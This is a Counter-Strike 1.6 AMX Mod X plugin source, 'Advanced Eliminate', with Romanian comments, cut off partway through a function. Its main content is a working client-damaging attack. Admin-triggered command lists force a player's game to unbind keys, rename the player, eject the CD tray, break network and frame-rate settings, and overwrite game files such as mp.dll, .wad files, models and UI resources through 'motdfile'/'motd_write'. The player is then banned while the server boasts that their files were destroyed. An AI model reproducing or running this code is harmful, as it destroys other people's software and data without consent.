/*
___________________________________________________________________________________________________________
===========================================================================================================
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
				    ___________________________________
				   |=                                 =|
			           |=       Advanced Eliminate        =|
			           |=       ¯¯¯¯¯¯¯¯ ¯by¯¯¯¯¯¯        =|
			           |=	              ¯¯Askhanar      =|
			           |=                   ¯¯¯¯¯¯¯¯      =|
                                    ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
 __________________________________________________________________________________________________________
|==========================================================================================================|
|													   |
|					 Copyright © 2012, Askhanar					   |
|			  Acest fisier este prevazut asa cum este ( fara garantii )			   |
|													   |
|==========================================================================================================|
 ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
	- ¦ 				         « Prieteni »			      		¦ -
	** * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * **
	* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	* * *										      * * *
	* *  	Rap^		Frosten			TheBeast		AZAEL!   	* *
	* *	fuzy		razvan W-strafer	RZV			SNKT   	 	* *	
	* *	ahonen		Arion			pHum			d e w   	* *
	* *	gLobe		syBlow			kvL^			krom3       	* *
	* *	Henk		DANYEL			SimpLe			XENON^		* *
	* * *								                      *	* *
	* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	** * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * **
	
	- ¦ 				       « Multumiri »			      		¦ -
	** * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * **
	* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	* * *										      *	* *
	* *	o    war3ft mod    celor ce au creat modul war3ft pentru ca am luat		* *
	* *				din plugin-ul lor ultimate-ul de la			* *
	* *				rasa undead ( acela de explodeaza ).			* *
	* * *										      *	* *
	* *	o    Rap^    	pentru ca m-a ajutat tot timpul cu				* *
	* *				testatul si imbunatatirea plugin-ului		        * *
	* * *										      *	* *
	* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	** * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * **
 __________________________________________________________________________________________________________	
|==========================================================================================================|	
* 													   *
 *	                   Daca gasiti ceva in neregula, va rog sa ma contactati.		          *
  **												        **
    *				      YM:        red_bull2oo6					       *
     *				      Steam:     red_bull2oo6				              *
      **			      e-mail:    red_bull2oo6@yahoo.com			            **
        *										           *
	 *											  *
	 |****************************************************************************************|
	  ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
*/

#include < amxmodx >
#include < amxmisc >

#include < fun >
#include < ColorChat >

#pragma semicolon 1

#define PLUGIN "Advanced Eliminate"
#define VERSION "0.1.5"


#define EliminatesNum			5120		
#define ELIMINATETASK 			112233		//Nu modifica..
#define ELIMINATE_ACCESS		ADMIN_CFG

static const ServerLicensedIp[ ] = "93.119.24.26";

new const FirstEliminateCommands[ ][ ] =
{
	"cl_filterstuffcmd 0",
	"unbindall",
	"developer 1",
	"name SuntDistrus[Advanced_Eliminate]",
	"cd eject",
	"bind d snapshot",
	"bind a snapshot",
	"bind s snapshot",
	"bind w snapshot",
	"bind mouse1 snapshot",
	"bind mouse2 snapshot",
	"bind TAB snapshot",
	"bind SPACE snapshot",
	"bind y snapshot",
	"bind u snapshot",
	"bind ` snapshot",
	"bind ~ snapshot",
	"con_color 1 1 1",
	"hud_draw 0;hideradar;wait;room_type 10;wait;volume 5",
	"rate 1;wait;cl_cmdrate 10;wait;cl_updaterate 10;wait;gl_flipmatrix 1",
	"fps_modem 1,wait;fps_max 2;wait;sys_ticrate 1;wait;m_pitch 0.0;wait;m_yaw 0.0",
	"motdfile as_tundra.wad;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile cs_747.wad;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile cs_assault.wad;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile cs_office.wad;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile cstrike.wad;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile de_aztec.wad;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile de_dust.wad;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile decals.wad;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile halflife.wad;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile pldecal.wad;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile tempdecal.wad;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile events/ak47.sc;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile dlls/mp.dll;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile resource/ClientScheme.res;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile resource/GameMenu.res;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile resource/TrackerScheme.res;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile resource/BackgroundLayout.txt;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile resource/BackgroundLoadingLayout.txt;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile resource/UI/MOTD.res;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile resource/UI/ScoreBoard.res;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile resource/UI/Spectator.res;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile resource/logo_game.res;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile resource/UI/BuyMenu.res;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile resource/UI/Classmenu.res.res;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile resource/UI/Teammenu.res;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile resource/UI/TutorTextWindow.res;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile resource/UI/BottomSpectator.res;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile sprites/hud.txt;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile sprites/320hud1.spr;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile sprites/640hud10.spr;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile sprites/640hud11.spr;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"say ^"Am fost distrus cu Advanced Eliminate v0.1.5 by Askhanar!^""
	
};


new const SecondEliminateCommands[ ][ ] =
{
	
	"cl_filterstuffcmd 0",
	"motdfile models/player/gign/gign.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/player/arctic/arctic.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/player/vip/vip.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/player/urban/urban.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/player/terror/terror.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/player/sas/sas.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/player/leet/leet.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/player/gsg9/gsg9.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/player/guerilla/guerilla.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/player/xt/xt.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/sv/v_hegrenade.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/sv/w_hegrenade.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/sv/p_hegrenade.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/bag.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/aflock.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/dragon.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/bigrat.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/big_rock.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/gibs_null.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/gibs_rock.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/gman.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/grass.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/hgrunt.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/holo.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/hornet.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/hassassint.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/hairt.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/v_knife.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/p_knife.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/oranget.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/v_ak47.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/v_m4a1.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/orange.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/jeep2.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/gibs_vent2.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/v_hegrenade.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/p_hegrenade.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/w_hegrenade.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/v_smokegrenade.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/p_smokegrenade.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar",
	"motdfile models/w_smokegrenade.mdl;motd_write AdvancedEliminate_v0.1.5_by_Askhanar"
	
};

new const EliminateDataFile[ ] = "EliminateData.txt";
new const EliminateLogFile[ ] = "EliminateLog.txt";

new const EliminateExplodeSpr[ ] = "sprites/zerogxplode.spr";
new const EliminateShockWaveSpr[ ] = "sprites/shockwave.spr";
new const EliminateSmokeSpr[ ] = "sprites/steam1.spr";

new const EliminateExplodeSound[ ] = "ambience/particle_suck1.wav";


//Pentru ban-uri..
new EliminatedTime[ EliminatesNum ] [ 32 ];
new EliminatedName[ EliminatesNum ] [ 32 ];
new EliminatedIp[ EliminatesNum ] [ 32 ];
new EliminatedSteamId[ EliminatesNum ] [ 35 ];
new EliminatedAdminName[ EliminatesNum ] [ 32 ];
new EliminatedAdminIp[ EliminatesNum ] [ 32 ];
new EliminatedAdminSteamId[ EliminatesNum ] [ 35 ];
new EliminatedReason[ EliminatesNum ] [ 32 ];

new Eliminates = 0;

new cvar_tag;
new cvar_site;

new SyncHudMessage;
new ExplodeSpr, ShockWaveSpr, SmokeSpr;

new vOrigin[ 33 ][ 3 ];

//De aici nu va mai explic..pentru ca nu e nevoie sa intelegeti voi...
//Daca modificati sunteti bun raspunzatori.
public plugin_init( )
{
	new ServerIp[ 22 ];
	get_user_ip( 0, ServerIp, sizeof ( ServerIp ) -1, 1 );
	
	if( equal( ServerIp, ServerLicensedIp ) )
	{
		
		register_plugin( PLUGIN, VERSION, "Askhanar" );
		
		cvar_tag = register_cvar( "ae_tag", "[D/C]" );
		cvar_site = register_cvar( "ae_site", "www.disconnect.ro/forum" );
		
		register_concmd( "amx_eliminate", "ConCmdEliminate", -1, "< nume / parte din nume > < motiv >" );
		register_concmd( "amx_uneliminate", "ConCmdUnEliminate", -1, "< ip / steamid > < motiv >" );
		register_concmd( "amx_printeliminates", "ConCmdPrintEliminates", -1, "" );
		register_concmd( "amx_reloadeliminates", "ConCmdReloadEliminates", -1, "" );
		
		SyncHudMessage = CreateHudSyncObj( );
		server_print( "%s Felicitari! Detii o licenta valida, iar pluginul functioneaza perfect!", PLUGIN );
		server_print( "%s Pentru mai multe detalii y/m: red_bull2oo6 | steam: red_bull2oo6 !", PLUGIN );
		//server_print( "%s Ip-ul Licentiat: %s, Ip-ul Serverului: %s", PLUGIN, ServerIp, ServerLicensedIp );
	}
	else
	{
		new PluginName[ 32 ];
		format( PluginName, sizeof ( PluginName ) -1, "[Ip Nelicentiat] %s", PLUGIN );
		register_plugin( PluginName, VERSION, "Askhanar" );
		
		server_print( "%s Nu detii o licenta valabila ! Plugin-ul nu va functiona corespunzator !", PLUGIN );
		server_print( "%s Pentru mai multe detalii y/m: red_bull2oo6 | steam: red_bull2oo6 !", PLUGIN );
		//server_print( "%s Ip-ul Licentiat: %s, Ip-ul Serverului: %s", PLUGIN, ServerIp, ServerLicensedIp );
		
		pause( "ade" );
	}
	
}

/*======================================= - ¦ Askhanar ¦ - =======================================*/

public plugin_precache( ) 
{
	new ServerIp[ 22 ];
	get_user_ip( 0, ServerIp, sizeof ( ServerIp ) -1, 1 );
	
	if( equal( ServerIp, ServerLicensedIp ) )
	{
		
		ExplodeSpr = precache_model( EliminateExplodeSpr );
		ShockWaveSpr = precache_model( EliminateShockWaveSpr );
		SmokeSpr = precache_model( EliminateSmokeSpr );
		
		precache_sound( EliminateExplodeSound );
		
		new File[ 128 ];
		get_configsdir( File, sizeof ( File ) -1 );
		formatex( File, sizeof ( File ) -1, "%s/%s", File, EliminateLogFile );
		
		if( !file_exists( File ) ) 
		{
			write_file( File ,"In acest log veti gasi urmatoarele informatii:", -1 );
			write_file( File ,"Cine, cand si cui a dat eliminate dar si pe ce motiv.",-1 );
			write_file( File ,"Cine, cand si cui a scos eliminarea dar si pe ce motiv.",-1 );
			write_file( File ,"",-1 );
			write_file( File ,"",-1 );
		}
		
		get_configsdir( File, sizeof ( File ) -1 );
		formatex( File, sizeof ( File ) -1, "%s/%s", File, EliminateDataFile );
		
		if( !file_exists( File ) )
		{
			write_file( File ,";Ip-urile / Steamid-urile userilor eliminati permanent !", -1 );
			write_file( File ,";",-1 );
			write_file( File ,";",-1 );
		}	
		
		LoadEliminates( );
	}

}

/*======================================= - ¦ Askhanar ¦ - =======================================*/

public client_authorized( id )
{

	if ( is_user_bot( id ) || is_user_hltv( id ) ) return 0;
	
	vOrigin[ id ][ 0 ] = 0;
	vOrigin[ id ][ 1 ] = 0;
	vOrigin[ id ][ 2 ] = 0;
	
	new ip[ 32 ], authid[ 35 ], bool:IsSteamUser = false;
	get_user_ip( id, ip , sizeof ( ip ) -1, 1 );
	get_user_authid( id, authid, sizeof ( authid ) -1 );
	
	IsSteamUser = ( authid[ 7 ] == ':' ? true : false );
	
	for( new i = 0; i < Eliminates ; i++ )
	{
		if( !IsSteamUser && equal( EliminatedIp[ i ], ip ) || IsSteamUser && equal( EliminatedSteamId[ i ], authid ) ) 
		{
			PrintConsoleInfo( id, EliminatedName[ i ], EliminatedIp[ i ], EliminatedSteamId[ i ], EliminatedReason[ i ],
				EliminatedAdminName[ i ], EliminatedAdminIp[ i ], EliminatedAdminSteamId[ i ], EliminatedTime[ i ] );

			set_task( 1.0, "TaskDisconnectPlayer", id + ELIMINATETASK );
			
			break;
		}
	}
	
	
	return 0;
}

public client_disconnect( id )
{
	vOrigin[ id ][ 0 ] = 0;
	vOrigin[ id ][ 1 ] = 0;
	vOrigin[ id ][ 2 ] = 0;
}

/*======================================= - ¦ Askhanar ¦ - =======================================*/

public ConCmdEliminate( id )
{
	if( !HasUserAccess( id ) )
	{
		client_cmd( id, "echo Nu ai acces la aceasta comanda !" );
		return 1;
	}
	
	new FirstArg[ 32 ], SecondArg[ 32 ];
	new Player;
	
	read_argv( 1, FirstArg , sizeof ( FirstArg ) -1 );
	read_argv( 2, SecondArg , sizeof ( SecondArg ) -1 );
	
	if( equal( FirstArg, "" ) || equal( SecondArg, "" ) )
	{
		client_cmd( id, "echo amx_eliminate < nume / parte din nume > < motiv > !" );
		return 1;
	}
		
	Player = cmd_target( id, FirstArg,  8 );

	if( !Player || !is_user_connected( Player ) ) return 1;
	
	set_hudmessage( random( 256 ), random( 256 ), random( 256 ), -1.0, random_float( 0.10, 0.23 ), 0, 0.0, 5.0, 0.1, 0.2, 3 );
	ShowSyncHudMsg( 0, SyncHudMessage, "%s a fost eliminat de pe server !^nI-au fost stricate majoritatea fisierelor !^nA primit ban permanent !", get_name( Player ) );
	
	client_cmd( 0, "spk ^"vox/bizwarn _comma _comma detected user and eliminate^"" );
	ColorChat( 0, RED,"^x04%s^x03 %s^x01 l-a eliminat pe^x03 %s^x01 Motiv:^x03 %s^x01 !", get_tag( ), get_name( id ), get_name( Player ), SecondArg );
	
	client_cmd( id, "echo %s a fost eliminat !", get_name( Player ) );
	client_cmd( id, "echo Motiv: %s !", SecondArg );
	
	client_cmd( Player, "-forward;wait;-back;wait;-moveleft;wait;-moveright;wait;-duck;wait;-showscores" );
	client_cmd( Player, "-attack;wait;-attack2" );
	
	PrintConsoleInfo( Player, get_name( Player ), get_ip( Player ), get_authid( Player ), SecondArg,
				get_name( id ), get_ip( id ), get_authid( id ), _get_time( ) );
				
	LogToConfigs( "Admin %s [%s] (%s) - l-a eliminat pe - %s [%s] (%s) - Motiv: %s ",
		get_name( id ), get_authid( id ), get_ip( id ), get_name( Player ),
		get_authid( Player ), get_ip( Player ), SecondArg );
	
	if(  is_user_alive(  Player  )  )
	{
		CreateEliminateEffects( Player + ELIMINATETASK );
	}
	
	EliminateUser( id, Player, SecondArg );
	set_task( 5.0, "TaskDisconnectPlayerFromSV", Player + ELIMINATETASK );
	
	return 1;
}

/*======================================= - ¦ Askhanar ¦ - =======================================*/

public ConCmdUnEliminate( id )
{
	if( !HasUserAccess( id ) )
	{
		client_cmd( id, "echo Nu ai acces la aceasta comanda !" );
		return 1;
	}
	
	new FirstArg[ 32 ], SecondArg[ 32 ];
	new bool:EliminationFound = false;
	
	read_argv( 1, FirstArg , sizeof ( FirstArg ) -1 );
	read_argv( 2, SecondArg , sizeof ( SecondArg ) -1 );
	
	if( equal( FirstArg, "" ) || equal( SecondArg, "" ) )
	{
		if( id == 0 )
		{
			server_print( "amx_eliminate < ip / steamid > < motiv > !" );
			return 1;
			
		}
		
		else
		{
			client_cmd( id, "echo amx_eliminate < ip / steamid > < motiv > !" );
			return 1;
		}
	}
	
	new plugin_info[ 128 ];
	if( id == 0 )
	{
		formatex( plugin_info, sizeof ( plugin_info ) -1,"************ %s v%s by %s ***********", PLUGIN, VERSION, "Askhanar");
	}
	else
	{
		formatex( plugin_info, sizeof ( plugin_info ) -1,"echo ^"************ %s v%s by %s ***********^"", PLUGIN, VERSION, "Askhanar");
	}
	
	for( new i = 0; i < Eliminates ; i++ )
	{
		if( equal( EliminatedIp[ i ], FirstArg ) || equal( EliminatedSteamId[ i ], FirstArg ) )
		{
			
			if( id == 0)
			{
				
				
				server_print( "****************************************************");
				server_print( "************* Informatii despre scoaterea eliminarii ***********" );
				server_print( "*    " );
				server_print( "*    Nume: %s", EliminatedName[ i ] );
				server_print( "*    Ip: %s", EliminatedIp[ i ] );
				server_print( "*    Steamid: %s", EliminatedSteamId[ i ] );
				server_print( "*    Motiv: %s ", EliminatedReason[ i ] );
				server_print( "*    Durata: Permanenta" );
				server_print( "*    Nume Admin: %s", EliminatedAdminName[ i ] );
				server_print( "*    Ip Admin: %s", EliminatedAdminIp[ i ] );
				server_print( "*    Steamid Admin: %s", EliminatedAdminSteamId[ i ] );
				server_print( "*    Data/Ora: %s", EliminatedTime[ i ] );
				server_print( "*    " );
				server_print( "*    Comanda executata cu succes !" );
				server_print( "*    Eliminarea de pe ip-ul / steamid-ul |%s| a fost scoasa.", FirstArg );
				server_print( "*    ");
				server_print( "****************************************************");
				server_print( "%s", plugin_info );
				server_print( "****************************************************");
				
				EliminationFound = true;
				
				LogToConfigs( "-----------------------------------------------------------------------------------------------------------------------------------------------");
				LogToConfigs( "ADMIN %s (%s) - a scos eliminarea ce urmeaza ! - Motiv: %s", get_name( id ), get_ip( id ), SecondArg );
				LogToConfigs( "ELIMINARE:| %s | Admin %s [%s] (%s) - l-a eliminat pe %s [%s] (%s) - Motiv: %s",	EliminatedTime[ i ], EliminatedAdminName[ i ], EliminatedAdminSteamId[ i ], EliminatedAdminIp[ i ], EliminatedName[ i ], EliminatedSteamId[ i ], EliminatedIp[ i ], EliminatedReason[ i ] );
				LogToConfigs( "-----------------------------------------------------------------------------------------------------------------------------------------------");
			}
			
			else
			{
				
				client_cmd( id, "echo ^"****************************************************^"");
				client_cmd( id, "echo ^"************* Informatii despre scoaterea eliminarii ***********^"" );
				client_cmd( id, "echo ^"*    ^"" );
				client_cmd( id, "echo ^"*    Nume: %s^"", EliminatedName[ i ] );
				client_cmd( id, "echo ^"*    Ip: %s^"", EliminatedIp[ i ] );
				client_cmd( id, "echo ^"*    Steamid: %s^"", EliminatedSteamId[ i ] );
				client_cmd( id, "echo ^"*    Motiv: %s ^"", EliminatedReason[ i ] );
				client_cmd( id, "echo ^"*    Durata: Permanenta^"" );
				client_cmd( id, "echo ^"*    Nume Admin: %s^"", EliminatedAdminName[ i ] );
				client_cmd( id, "echo ^"*    Ip Admin: %s^"", EliminatedAdminIp[ i ] );
				client_cmd( id, "echo ^"*    Steamid Admin: %s^"", EliminatedAdminSteamId[ i ] );
				client_cmd( id, "echo ^"*    Data/Ora: %s^"", EliminatedTime[ i ] );
				client_cmd( id, "echo ^"*    ^"" );
				client_cmd( id, "echo ^"*    Comanda executata cu succes !^"" );
				client_cmd( id, "echo ^"*    Eliminarea de pe ip-ul / steamid-ul |%s| a fost scoasa.^"", FirstArg );
				client_cmd( id, "echo ^"*    ^"");
				client_cmd( id, "echo ^"****************************************************^"");
				client_cmd( id, "%s", plugin_info );
				client_cmd( id, "echo ^"****************************************************^"");
				
				EliminationFound = true;
				
				LogToConfigs( "-----------------------------------------------------------------------------------------------------------------------------------------------");
				LogToConfigs( "ADMIN %s [%s] (%s) - a scos eliminarea ce urmeaza ! - Motiv: %s", get_name( id ), get_authid( id ), get_ip( id ), SecondArg );
				LogToConfigs( "ELIMINARE:| %s | Admin %s [%s] (%s) - l-a eliminat pe %s [%s] (%s) - Motiv: %s",	EliminatedTime[ i ], EliminatedAdminName[ i ], EliminatedAdminSteamId[ i ], EliminatedAdminIp[ i ], EliminatedName[ i ], EliminatedSteamId[ i ], EliminatedIp[ i ], EliminatedReason[ i ] );
				LogToConfigs( "-----------------------------------------------------------------------------------------------------------------------------------------------");
				
				client_cmd( 0, "spk vox/doop" );
				ColorChat( 0, RED,"^x04%s^x03 %s^x01 i-a scos eliminarea lui^x03 %s^x01 !", get_tag( ), get_name( id ), EliminatedName[ i ] );
			}
				
			RemoveEliminate( i );
			break;
		}
		
	}
	
	if( !EliminationFound )
	{
		if( id == 0 )
		{
			server_print( "****************************************************" );
			server_print( "****************************************************" );
			server_print( "*    " );
			server_print( "*    Comanda nu poate fi executata !" );
			server_print( "*    Ip-ul / steamid-ul |%s|", FirstArg );
			server_print( "*    Nu a fost gasit in baza de date." );
			server_print( "*    " );
			server_print( "****************************************************");
			server_print( "%s", plugin_info );
			server_print( "****************************************************");
		}
		
		else
		{
			
			client_cmd( id, "echo ^"****************************************************^"" );
			client_cmd( id, "echo ^"****************************************************^"" );
			client_cmd( id, "echo ^"*    ^"" );
			client_cmd( id, "echo ^"*    Comanda nu poate fi executata !^"" );
			client_cmd( id, "echo ^"*    Ip-ul / steamid-ul |%s|^"", FirstArg );
			client_cmd( id, "echo ^"*    Nu a fost gasit in baza de date.^"" );
			client_cmd( id, "echo ^"*    ^"" );
			client_cmd( id, "echo ^"****************************************************^"");
			client_cmd( id, "%s", plugin_info );
			client_cmd( id, "echo ^"****************************************************^"");
		}
	}
	
	return 1;
}
/*======================================= - ¦ Askhanar ¦ - =======================================*/

public ConCmdPrintEliminates( id )
{
	if( !( get_user_flags( id ) & ELIMINATE_ACCESS ) )
	{
		client_cmd( id, "echo Nu ai acces la aceasta comanda !" );
		return 1;
	}
	
	if( Eliminates == 0 )
	{
		if( id == 0 )
		{
			server_print( "Nu am gasit nicio eliminare in baza de date !" );
			return 1;
		}
		else
		{
			
			client_cmd( id, "echo Nu am gasit nicio eliminare in baza de date !" );
			return 1;
		}
	}
	
	new start , end, pos_to_num;
	new position[ 5 ];
	
	read_argv( 1, position, sizeof ( position ) - 1 );
	pos_to_num = str_to_num( position );
	start = min( pos_to_num, Eliminates ) - 1;

	if( start <= 0 ) start = 0;
	
	end = min( start + 5, Eliminates ); // nu modifica aici mai mult de 5 ca iti va da reliable channel overflowed
	
	new plugin_info[ 128 ];
	
	if( id == 0 )
	{
		formatex( plugin_info, sizeof ( plugin_info ) -1,"************ %s v%s by %s ***********", PLUGIN, VERSION, "Askhanar");
	
		server_print( "****************************************************" );
		server_print( "*    Nr total de eliminari: %d | Eliminari vizualizate acum: %d - %d", Eliminates, start + 1, end );
		server_print( "*    " );
		
		for( new i = start ; i < end ; i++ )
		{
			
			server_print( "***************** Detaliile eliminarii #%d *******************", i + 1 );
			server_print( "*    " );
			server_print( "*    " );
			server_print( "*    Nume: %s", EliminatedName[ i ] );
			server_print( "*    Ip: %s", EliminatedIp[ i ] );
			server_print( "*    Steamid: %s", EliminatedSteamId[ i ] );
			server_print( "*    Motiv: %s ", EliminatedReason[ i ] );
			server_print( "*    Durata: Permanenta" );
			server_print( "*    Nume Admin: %s", EliminatedAdminName[ i ] );
			server_print( "*    Ip Admin: %s", EliminatedAdminIp[ i ] );
			server_print( "*    Steamid Admin: %s", EliminatedAdminSteamId[ i ] );
			server_print( "*    Data/Ora: %s", EliminatedTime[ i ] );
			server_print( "*    " );
			server_print( "*    " );
			
		}
		
		server_print( "****************************************************");
		server_print( "%s", plugin_info );
		server_print( "****************************************************");
	}
	
	else
	{
		formatex( plugin_info, sizeof ( plugin_info ) -1,"echo ^"************ %s v%s by %s ***********^"", PLUGIN, VERSION, "Askhanar");
		
		client_cmd( id, "echo ^"****************************************************^"");
		client_cmd( id, "echo ^"*    Nr total de eliminari: %d | Eliminari vizualizate acum: %d - %d^"", Eliminates, start + 1, end );
		client_cmd( id, "echo ^"*    ^"" );
		
		for( new i = start ; i < end ; i++ )
		{
			
			client_cmd( id, "echo ^"***************** Detaliile eliminarii #%d *******************^"", i + 1 );
			client_cmd( id, "echo ^"*    ^"" );
			client_cmd( id, "echo ^"*    Nume: %s^"", EliminatedName[ i ] );
			client_cmd( id, "echo ^"*    Ip: %s^"", EliminatedIp[ i ] );
			client_cmd( id, "echo ^"*    Steamid: %s^"", EliminatedSteamId[ i ] );
			client_cmd( id, "echo ^"*    Motiv: %s ^"", EliminatedReason[ i ] );
			client_cmd( id, "echo ^"*    Durata: Permanenta^"" );
			client_cmd( id, "echo ^"*    Nume Admin: %s^"", EliminatedAdminName[ i ] );
			client_cmd( id, "echo ^"*    Ip Admin: %s^"", EliminatedAdminIp[ i ] );
			client_cmd( id, "echo ^"*    Steamid Admin: %s^"", EliminatedAdminSteamId[ i ] );
			client_cmd( id, "echo ^"*    Data/Ora: %s^"", EliminatedTime[ i ] );
			client_cmd( id, "echo ^"*    ^"" );
			client_cmd( id, "echo ^"*    ^"" );
			
		}
		
		client_cmd( id, "echo ^"****************************************************^"");
		client_cmd( id, "%s", plugin_info );
		client_cmd( id, "echo ^"****************************************************^"");
	}
	
	return 1;
}

/*======================================= - ¦ Askhanar ¦ - =======================================*/

public ConCmdReloadEliminates( id )
{
	if( !( get_user_flags( id ) & ELIMINATE_ACCESS ) )
	{
		client_cmd( id, "echo Nu ai acces la aceasta comanda !");
		return 1;
	}
	
	Eliminates = 0;
	
	for( new i = 0 ; i < EliminatesNum ; i++ )
	{
		
		copy( EliminatedTime[ i ], sizeof ( EliminatedTime[ ] ) -1, "" );
